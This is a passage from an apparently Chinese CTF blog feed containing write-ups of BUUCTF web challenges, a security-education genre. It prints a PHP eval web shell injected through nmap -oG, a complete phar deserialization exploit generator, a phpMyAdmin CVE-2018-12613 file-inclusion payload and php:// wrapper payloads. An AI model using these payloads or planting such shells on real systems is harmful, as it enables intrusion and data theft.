</li>
<li><p>由于 <code>escapeshellarg</code> 先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>经过 <code>escapeshellcmd</code> 针对第二步处理之后的参数中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行处理转义之后的效果如下所示：</p>
</li>
</ol>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbncgukj30ic05tjrp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbncgukj30ic05tjrp.jpg" class="lazyload"></a></p>
<p>所以这个payload可以简化为<code>curl 127.0.0.1\ -v -d a=1&#39;</code>，即向 <code>127.0.0.1\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</p>
<p>但是如果是先用 <code>escapeshellcmd</code> 函数过滤，再用的 <code>escapeshellarg</code> 函数过滤，则没有这个问题。</p>
<hr>
<h2 id="回归题目"><a href="#回归题目" class="headerlink" title="回归题目"></a>回归题目</h2><p>题目还有一个 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure></div>

<p>这有个 <code>system</code> 来执行命令</p>
<p>代码本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
<p>这里常见的命令后注入操作如 <code>| &amp; &amp;&amp;</code> 都不行，虽然我们通过上面的操作逃过了单引号，但 <code>escapeshellcmd</code> 会对这些特殊符号前面加上 <code>\</code> 来转移</p>
<p>查找到在nmap命令中 有一个参数 <code>-oG</code> 可以实现将命令和结果写到文件<br>这个命令就是我们的输入可控，然后写入到文件，传马</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;manayakko&quot;]);?&gt; -oG yakko.php &#x27;</span><br></pre></td></tr></table></figure></div>

<p>上菜刀 获得flag</p>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">BUUCTF 2018 Online Tool</a><br><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">谈谈escapeshellarg参数绕过和注入的问题</a><br><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a> </p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay7</title>
    <url>/yakko117/2020/01/16/BuuctfDay7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>加深一下对phar相关知识的理解，进入登陆界面，随便测了下弱口令和sql，发现没什么反应，那就注册一个账号</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dzmmj30es0d6dfz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dzmmj30es0d6dfz.jpg" class="lazyload"></a></p>
<p>进入页面后，发现有上传点，先上传 <code>phpinfo</code> 看看有哪些过滤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1gaxpj30ho0du40q.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1gaxpj30ho0du40q.jpg" class="lazyload"></a></p>
<p>上传后，发现通过了，居然没有过滤，emmmm </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dvwvj30t504kwef.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dvwvj30t504kwef.jpg" class="lazyload"></a></p>
<p>那就再下下来看看情况</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1hnbij30me0b90ux.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1hnbij30me0b90ux.jpg" class="lazyload"></a></p>
<p>emmmmm，这个<code>filename</code>直接裸露在面前，任意文件读取？<br>尝试下下载源码，由于我们上传的文件是放在 <code>主目录/sandbox/hash</code> 目录下的，所以要想下载php文件必须跳转到上级目录</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1f17ej307t03b3yi.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1f17ej307t03b3yi.jpg" class="lazyload"></a></p>
<p>既然这样，我们再试下删除，这里的<code> delete.php</code> 一定也存在任意文件删除漏洞。如此我们可以下载下来这个网站的所有php文件，除了<code>index.php</code>，还有已经遇见的 <code>upload.php、 register.php、 login.php、 download.php、 delete.php</code>，再加上这些php文件中include的 <code>class.php</code> ，我们都下载下来。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1wa2qj307906w745.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1wa2qj307906w745.jpg" class="lazyload"></a></p>
<p>在本地搭建环境，既然有源码，接下来就是审计的问题。</p>
<hr>
<h1 id="代码审计就挑些重点讲了"><a href="#代码审计就挑些重点讲了" class="headerlink" title="代码审计就挑些重点讲了"></a>代码审计就挑些重点讲了</h1><h2 id="Class-php"><a href="#Class-php" class="headerlink" title="Class.php"></a>Class.php</h2><p>先是和数据库建立连接，而后分别是User类，FileList类，File类</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这里参数进行限制绑定，后面还有是<code>User类，FileList类，File类</code><br>然后发现和数据库交互的语句全部进行了参数绑定，SQL注入就没意义了</p>
<p>在 <code>FileList 类</code> 中发现了 <code>function __call($func, $args)</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>PHP5 的对象新增了一个专用方法 __call()，这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在的方法，__call 方法将会被自动调用，提醒该考虑使用phar了。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar文件是php的压缩文件，它可以把多个文件归档到同一个文件中</span><br><span class="line">而且不经过解压就能被 php 访问并执行</span><br><span class="line">phar://与file://，php://等类似，也是一种流包装器。</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Download-php-发现了些hint"><a href="#Download-php-发现了些hint" class="headerlink" title="Download.php 发现了些hint"></a>Download.php 发现了些hint</h2><p>虽然 <code>filename</code> 我们可控，导致任意了任意下载<br>但是它不让我们下载文件名里有flag的文件，暗示我们本题中要读取文件名里有<code>&#39;flag&#39;</code>的文件</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>在 <code>in_set</code> 这个函数中，可以设置php的一些配置，其中就包括 <code>open_basedir</code> ，用来限制当前程序可以访问的目录。后来了解到：<strong>它是可以访问设置目录下的所有下级目录。</strong></p>
<p>若<code>&quot;open_basedir = /dir/user&quot;</code>, 那么目录 <code>&quot;/dir/user&quot;</code> 和 <code>/dir/other</code> 都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。<code>&quot;.&quot;</code>可代表当前目录，<code>open_basedir</code> 也可以同时设置多个目录，在Windows中用分号分隔目录，在任何其它系统中用冒号分隔目录。<br>例如上面：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;); </span><br></pre></td></tr></table></figure></div>
<p>就是只可以访问当前目录<code>(getcwd()返回当前目录)</code>、<code>/etc</code> 和 <code>/tmp</code> 三个目录。<strong>解释了为什么要在delete.php中利用payload，而不是download.php</strong></p>
<hr>
<h2 id="Delete-php"><a href="#Delete-php" class="headerlink" title="Delete.php"></a>Delete.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><p><code>chdir()</code> 现实目录跳跃，解释了为什么下载时要<code>filename = ../../index.php</code> ，而不是 <code>filename = index.php</code>。</p>
<hr>
<h2 id="总结几点"><a href="#总结几点" class="headerlink" title="总结几点"></a>总结几点</h2><ul>
<li><p>File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。</p>
</li>
<li><p>User类中存在close方法，并且该方法在对象销毁时执行。</p>
</li>
<li><p>同时FileList类中存在 <code>__call()</code>，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。</p>
</li>
</ul>
<p>根据以上梳理一下可以得出结论:</p>
<p>如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，<strong>当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。</strong>通过分析FileList类的析构方法可以知道，<code>close方法执行后存在results变量里的结果会加入到table变量中被打印出来</code>，也就是flag会被打印出来。</p>
<hr>
<p>运行如下PHP文件，生成一个phar文件，更改后缀名为png进行上传。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在删除时使用bp抓包，修改参数，即可得到flag。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1g6wcj31500ehtda.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1g6wcj31500ehtda.jpg" class="lazyload"></a></p>
<hr>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/20175211lyz/p/11468401.html">刷题记录：[CISCN2019 华北赛区 Day1 Web1]Dropbox</a><br><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a><br><a href="https://www.jianshu.com/p/5b91e0b7f3ac">[CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见</a><br><a href="https://xz.aliyun.com/t/2715#toc-0">初探phar:&#x2F;&#x2F;</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">CTF PHP反序列化</a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay8</title>
    <url>/yakko117/2020/02/09/Buuctfday8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>扫后台只扫到了 <code>robots.txt</code><br>然后得到了 <code>phpinfo.php</code>，查看信息<br>看到了3306端口开着，根据题意推断存在 <code>phpmyadmin</code><br>然后找到路径</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node3.buuoj.cn/phpmyadmin/index.php</span><br></pre></td></tr></table></figure></div>

<p>显示 <code>phpMyAdmin版本信息：4.8.1</code> 网上找到个 <code>CVE-2018-12613</code><br><code>PhpMyadmin后台文件包含</code>，然后提交如下Payload，回显得到 <code>flag</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>开门见山，题目还算简单</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))</span><br></pre></td></tr></table></figure></div>

<p>需要POST <code>$text</code> 为 <code>welcome to the zjctf</code> 才能进行后面的步骤<br>这里用伪协议在以POST形式传入 <code>welcome to the zjctf</code><br>绕过如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br><span class="line"></span><br><span class="line">base64 绕过过滤，当然，这里没过滤字符，不加密也能执行</span><br><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></figure></div>

<p>然后看到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure></div>

<p>正则过滤掉<code>flag</code>，提示一个 <code>useless.php</code> 用<code>php://filter</code> 读文件<br>Payload 如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure></div>

<p>得到的base64的字符串解码就是 <code>useless.php</code></p>
